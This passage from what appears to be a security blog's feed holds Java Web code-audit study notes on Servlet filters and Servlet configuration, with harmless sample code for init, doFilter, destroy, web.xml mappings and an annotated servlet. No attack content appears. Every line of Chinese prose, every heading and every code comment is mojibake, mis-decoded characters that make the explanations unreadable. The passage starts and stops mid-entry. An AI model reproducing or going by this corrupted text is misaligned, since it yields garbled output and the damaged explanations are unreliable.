1|æœåŠ¡å™¨|æœåŠ¡å™¨è¿”å›ç»“æœç»™ç”¨æˆ·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆç”¨æˆ·å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œä¹‹åè¯·æ±‚ç»è¿‡è¿‡æ»¤å™¨åˆ°è¾¾ Servlet ä¸­çš„ service() æ–¹æ³•ï¼Œæœ€åå†ç»è¿‡è¿‡æ»¤å™¨è¿”å›ç»™ç”¨æˆ·ã€‚</p><p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯è¿‡æ»¤å™¨åœ¨æ¥æ”¶è¯·æ±‚å’Œè¿”å›è¯·æ±‚çš„æ—¶å€™é¡ºåºæ˜¯ç›¸åçš„ã€‚</p><h1 id="0x03-filter-çš„æ¥å£æ–¹æ³•"><a href="#0x03-filter-çš„æ¥å£æ–¹æ³•" class="headerlink" title="0x03 filter çš„æ¥å£æ–¹æ³•"></a>0x03 filter çš„æ¥å£æ–¹æ³•</h1><p>filter æ¥å£æ–¹æ³•å¦‚ä¸‹ï¼š</p><h2 id="1ã€init-æ¥å£"><a href="#1ã€init-æ¥å£" class="headerlink" title="1ã€init() æ¥å£"></a>1ã€init() æ¥å£</h2><p>è¯¥æ¥å£ä¸ Servlet é‡Œçš„ init() æ–¹æ³•ç±»ä¼¼ï¼Œä¸»è¦ç”¨æ¥åˆå§‹åŒ–è¿‡æ»¤å™¨ã€‚å¦‚æœåˆå§‹åŒ–ä»£ç ä¸­è¦ç”¨åˆ° FilterConfig å¯¹è±¡ï¼Œé‚£è¿™äº›åˆå§‹åŒ–ä»£ç åªèƒ½åœ¨ filter çš„ init() æ–¹æ³•ä¸­ç¼–å†™ã€‚</p><p>init() æ–¹æ³•çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*åˆå§‹åŒ–æ–¹æ³•  æ¥æ”¶ä¸€ä¸ªFilterConfigç±»å‹çš„å‚æ•° è¯¥å‚æ•°æ˜¯å¯¹Filterçš„ä¸€äº›é…ç½®*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2ã€doFilter-æ¥å£"><a href="#2ã€doFilter-æ¥å£" class="headerlink" title="2ã€doFilter() æ¥å£"></a>2ã€doFilter() æ¥å£</h2><p>doFilter æ–¹æ³•ç±»ä¼¼äº Servlet æ¥å£çš„ service() æ–¹æ³•ï¼Œfilter é€šè¿‡è¯¥æ¥å£å®ç°å…·ä½“çš„è¿‡æ»¤æ“ä½œï¼Œå½“å®¢æˆ·è¯·æ±‚è®¿é—®ä¸è¿‡æ»¤å™¨å…³è”çš„ URL çš„æ—¶å€™ï¼ŒServlet è¿‡æ»¤å™¨å°†å…ˆæ‰§è¡ŒdoFilter æ–¹æ³•ï¼ŒFilterChain å‚æ•°ç”¨äºè®¿é—®åç»­è¿‡æ»¤å™¨ã€‚</p><p>doFilter() æ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> resp<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*è¿‡æ»¤æ–¹æ³• ä¸»è¦æ˜¯å¯¹requestå’Œresponseè¿›è¡Œä¸€äº›å¤„ç†ï¼Œç„¶åäº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ–Servletå¤„ç†*/</span>          chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//äº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ–servletå¤„ç†</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3ã€destroy-æ¥å£"><a href="#3ã€destroy-æ¥å£" class="headerlink" title="3ã€destroy() æ¥å£"></a>3ã€destroy() æ¥å£</h2><p>destroy() æ¥å£å’Œ servlet é‡Œçš„ destroy() ä½œç”¨ç±»ä¼¼ï¼Œç”¨äºé‡Šæ”¾è¢« filter æ‰“å¼€çš„èµ„æºï¼Œå¦‚å…³é—­æ•°æ®åº“ç­‰ã€‚</p><p>destroy() æ–¹æ³•çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*é”€æ¯æ—¶è°ƒç”¨*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="0x04-filter-çš„ç”Ÿå‘½å‘¨æœŸ"><a href="#0x04-filter-çš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="0x04 filter çš„ç”Ÿå‘½å‘¨æœŸ"></a>0x04 filter çš„ç”Ÿå‘½å‘¨æœŸ</h1><p>filter çš„ç”Ÿå‘½å‘¨æœŸä¸ servlet çš„ç”Ÿå‘½å‘¨æœŸæ¯”è¾ƒç±»ä¼¼ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111161127002.png"></p><p>å½“ Web å®¹å™¨å¯åŠ¨æ—¶ï¼Œä¼šæ ¹æ® web.xml ä¸­å£°æ˜çš„ filter é¡ºåºä¾æ¬¡å®ä¾‹åŒ–è¿™äº› filterã€‚</p><p>è¿™é‡Œä¼šæ ¹æ®å®é™…æƒ…å†µçš„ä¸åŒï¼ŒdoFilter() æ–¹æ³•å¯èƒ½ä¼šè¢«è°ƒç”¨å¤šæ¬¡ï¼Œæœ€åå½“ç¨‹åºå…³é—­æˆ–è€…å¸è½½æ—¶è°ƒç”¨ destroy() æ–¹æ³•ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/Soinice/article/details/82787964">https://blog.csdn.net/Soinice/article/details/82787964</a></p><p><a href="https://www.cnblogs.com/tanghaorong/p/12811457.html">https://www.cnblogs.com/tanghaorong/p/12811457.html</a></p><p><a href="https://blog.csdn.net/yuzhiqiang_1993/article/details/81288912">https://blog.csdn.net/yuzhiqiang_1993/article/details/81288912</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h1&gt;&lt;p&gt;filter è¢«ç§°ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯ Servlet 2.3 æ–°å¢çš„ä¸€ä¸ªç‰¹æ€§ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ Serlvet æŠ€</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘Java Web æ ¸å¿ƒæŠ€æœ¯-Servlet</title>
    <link href="https://www.teamssix.com/211115-165745.html"/>
    <id>https://www.teamssix.com/211115-165745.html</id>
    <published>2021-11-15T08:57:45.000Z</published>
    <updated>2021-11-22T08:59:50.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>Servlet æ˜¯ Java Web å®¹å™¨ä¸­è¿è¡Œçš„å°ç¨‹åºï¼ŒServlet åŸåˆ™ä¸Šå¯ä»¥é€šè¿‡ä»»ä½•å®¢æˆ·ç«¯-æœåŠ¡ç«¯åè®®è¿›è¡Œé€šä¿¡ï¼Œä½†å®ƒä»¬å¸¸ä¸ HTTP ä¸€èµ·ä½¿ç”¨ï¼Œå› æ­¤ Servlet é€šå¸¸ä½œä¸º â€œHTTP Servletâ€çš„ç®€å†™ã€‚</p><p>Servlet æ˜¯ Java EE çš„æ ¸å¿ƒï¼Œä¹Ÿæ˜¯æ‰€æœ‰ MVC æ¡†æ¶å®ç°çš„æ ¹æœ¬ã€‚</p><h1 id="0x01-Servlet-çš„é…ç½®"><a href="#0x01-Servlet-çš„é…ç½®" class="headerlink" title="0x01 Servlet çš„é…ç½®"></a>0x01 Servlet çš„é…ç½®</h1><p>ç‰ˆæœ¬ä¸åŒï¼ŒServlet çš„é…ç½®ä¸åŒï¼ŒServlet 3.0 ä¹‹å‰çš„ç‰ˆæœ¬éƒ½æ˜¯åœ¨ web.xml ä¸­é…ç½®çš„ï¼Œåœ¨ 3.0 ä¹‹åçš„ç‰ˆæœ¬ä¸­åˆ™ä½¿ç”¨æ›´ä¸ºæ–¹ä¾¿çš„æ³¨è§£æ–¹æ³•æ¥é…ç½®ã€‚</p><p>æ­¤å¤–ä¸åŒç‰ˆæœ¬çš„ Servlet æ‰€éœ€è¦çš„ Java/JDK ç‰ˆæœ¬ä¹Ÿä¸åŒï¼Œå…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151655826.png"></p><h2 id="1ã€åŸºäº-web-xml-çš„é…ç½®"><a href="#1ã€åŸºäº-web-xml-çš„é…ç½®" class="headerlink" title="1ã€åŸºäº web.xml çš„é…ç½®"></a>1ã€åŸºäº web.xml çš„é…ç½®</h2><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºäº web.xml çš„ Servlet é…ç½®æ–‡ä»¶</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd<span class="token punctuation">"</span></span>           <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.sec.servlet.UserServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ web.xml ä¸­ï¼ŒServlet çš„é…ç½®åœ¨ Servlet æ ‡ç­¾ä¸­ï¼ŒServlet æ ‡ç­¾ç”± Servlet å’Œ Servlet-mapping æ ‡ç­¾ç»„æˆï¼Œä¸¤è€…é€šè¿‡æ ‡ç­¾ä¸­ç›¸åŒçš„ Servlet-name å®ç°å…³è”ï¼Œä¸Šè¿°é…ç½®æ–‡ä»¶ä¸­çš„æ ‡ç­¾å«ä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;servlet&gt;å£°æ˜ Servlet é…ç½®å…¥å£&lt;description&gt;å£°æ˜ Servlet æè¿°ä¿¡æ¯&lt;display-name&gt;å®šä¹‰ Web åº”ç”¨çš„åç§°&lt;servlet-name&gt;å£°æ˜ Servlet åç§°ä»¥ä¾¿åœ¨åé¢çš„æ˜ å°„æ—¶ä½¿ç”¨&lt;servlet-class&gt;æŒ‡å®šå½“å‰ Servlet å¯¹åº”çš„ç±»çš„è·¯å¾„&lt;servlet-mapping&gt;æ³¨å†Œç»„ä»¶è®¿é—®é…ç½®çš„è·¯å¾„å…¥å£&lt;servlet-name&gt;æŒ‡å®šä¸Šæ–‡é…ç½®çš„ Servlet åç§°&lt;url-pattern&gt;æŒ‡å®šé…ç½®è¿™ä¸ªç»„ä»¶çš„è®¿é—®è·¯å¾„<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2ã€åŸºäºæ³¨è§£æ–¹å¼"><a href="#2ã€åŸºäºæ³¨è§£æ–¹å¼" class="headerlink" title="2ã€åŸºäºæ³¨è§£æ–¹å¼"></a>2ã€åŸºäºæ³¨è§£æ–¹å¼</h2><p>Servlet 3.0 ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œå¼€å‘è€…æ— é¡»åœ¨ web.xml é‡Œé…ç½® Servletï¼Œåªéœ€è¦æ·»åŠ  @WebServlet æ³¨è§£å³å¯ä¿®æ”¹ Servlet çš„å±æ€§ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span><span class="token punctuation">;</span><span class="token comment">/** * åŸºäºæ³¨è§£å¼€å‘Servlet */</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token string">"/ann.do"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AnnotationServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.0 Transitional//EN'>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;HTML>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;HEAD>&lt;TITLE> ITBZ &lt;/TITLE>&lt;/HEAD>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;BODY>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Annotation Servlet!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/BODY>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/HTML>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨è§£å‚æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151656906.png"></p><p>é€šè¿‡å›¾ä¸­çš„ã€Œç­‰ä»·äº web.xml çš„æ ‡ç­¾ã€ä¸€æ å¯ä»¥çœ‹å‡ºï¼Œweb.xml å¯ä»¥é…ç½®çš„ Servlet å±æ€§éƒ½å¯ä»¥é€šè¿‡ @WebServlet çš„æ–¹å¼è¿›è¡Œé…ç½®ã€‚</p><h1 id="0x02-Servlet-çš„è®¿é—®æµç¨‹"><a href="#0x02-Servlet-çš„è®¿é—®æµç¨‹" class="headerlink" title="0x02 Servlet çš„è®¿é—®æµç¨‹"></a>0x02 Servlet çš„è®¿é—®æµç¨‹</h1><p>ä»¥ä¸Šæ–‡ä¸­çš„ web.xml é…ç½®æ–‡ä»¶ä¸ºä¾‹ï¼Œå…¶è®¿é—®æµç¨‹å¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151656655.png"></p><p>é¦–å…ˆç”¨æˆ·åœ¨æµè§ˆå™¨é‡Œè¾“å…¥URLï¼Œç„¶åæµè§ˆå™¨å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨é€šè¿‡ servlet-mapping æ ‡ç­¾æ‰¾åˆ°æ–‡ä»¶åä¸º user çš„ url-patternï¼Œé€šè¿‡å…¶å¯¹åº”çš„ servlet-name å¯»æ‰¾ servlet æ ‡ç­¾ä¸­ servlet-name ç›¸åŒçš„ servletï¼Œå†è·å–å…¶ servlet æ ‡ç­¾é‡Œçš„ servlet-class å‚æ•°ï¼Œæœ€åå¾—åˆ°å…·ä½“çš„ class æ–‡ä»¶è·¯å¾„ï¼Œä»è€Œæ‰§è¡Œç›¸å…³æ–‡ä»¶ã€‚</p><h1 id="0x03-Servlet-çš„æ¥å£æ–¹æ³•"><a href="#0x03-Servlet-çš„æ¥å£æ–¹æ³•" class="headerlink" title="0x03 Servlet çš„æ¥å£æ–¹æ³•"></a>0x03 Servlet çš„æ¥å£æ–¹æ³•</h1><h2 id="1ã€init-æ¥å£"><a href="#1ã€init-æ¥å£" class="headerlink" title="1ã€init() æ¥å£"></a>1ã€init() æ¥å£</h2><p>åœ¨ Servlet å®ä¾‹åŒ–åï¼ŒServlet å®¹å™¨ä¼šè°ƒç”¨ init() æ–¹æ³•æ¥åˆå§‹åŒ–è¯¥å¯¹è±¡ï¼Œä¸»è¦æ˜¯ä¸ºäº†è®© Servlet å¯¹è±¡åœ¨å¤„ç†å®¢æˆ·è¯·æ±‚å‰å¯ä»¥å®Œæˆä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œï¼Œä¾‹å¦‚å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œè·å–é…ç½®ä¿¡æ¯ç­‰ã€‚</p><p>å¯¹äºæ¯ä¸€ä¸ª Servlet å®ä¾‹ï¼Œinit() æ–¹æ³•åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ã€‚</p><p>init() æ–¹æ³•çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">&#123;</span>    <span class="token comment">// å¼€å‘è€…è‡ªå®šä¹‰ä»£ç </span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2ã€service-æ¥å£"><a href="#2ã€service-æ¥å£" class="headerlink" title="2ã€service() æ¥å£"></a>2ã€service() æ¥å£</h2><p>service() æ–¹æ³•æ˜¯æ‰§è¡Œå®é™…ä»»åŠ¡çš„ä¸»è¦æ–¹æ³•ï¼ŒServlet å®¹å™¨è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰çš„è¯·æ±‚ï¼Œå¹¶å°†æ ¼å¼åŒ–çš„å“åº”å†™å›å®¢æˆ·ç«¯ï¼Œæ¯æ¬¡æœåŠ¡å™¨æ¥æ”¶åˆ°ä¸€ä¸ª Servlet è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„çº¿ç¨‹å¹¶è°ƒç”¨æœåŠ¡ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ service() æ–¹æ³•è¢«å®¹å™¨è°ƒç”¨ä¹‹å‰ï¼Œå¿…é¡»ç¡®ä¿ init() æ–¹æ³•æ­£ç¡®å®Œæˆã€‚</p><p>service() æ–¹æ³•çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> service <span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">ServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>     <span class="token comment">// å¼€å‘è€…è‡ªå®šä¹‰ä»£ç </span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3ã€doGet-doPost-ç­‰æ¥å£"><a href="#3ã€doGet-doPost-ç­‰æ¥å£" class="headerlink" title="3ã€doGet() / doPost() ç­‰æ¥å£"></a>3ã€doGet() / doPost() ç­‰æ¥å£</h2><p>doGet() ç­‰æ–¹æ³•éœ€è¦æ ¹æ® HTTP çš„ä¸åŒè¯·æ±‚è°ƒç”¨ä¸åŒçš„æ–¹æ³•ï¼Œå¦‚æœ HTTP å¾—åˆ°ä¸€ä¸ªæ¥è‡ª URL çš„ GET è¯·æ±‚ï¼Œå°±ä¼šè°ƒç”¨ doGet() æ–¹æ³•ï¼ŒåŒæ ·çš„ï¼Œå¦‚æœå¾—åˆ° POST è¯·æ±‚ï¼Œå°±ä¼šè°ƒç”¨ doPost() æ–¹æ³•ã€‚</p><p>è¿™ç±»æ–¹æ³•çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>    <span class="token comment">// å¼€å‘è€…è‡ªå®šä¹‰ä»£ç </span>    <span class="token comment">// å¦‚æœæ˜¯ POST è¯·æ±‚ï¼Œåˆ™è°ƒç”¨ 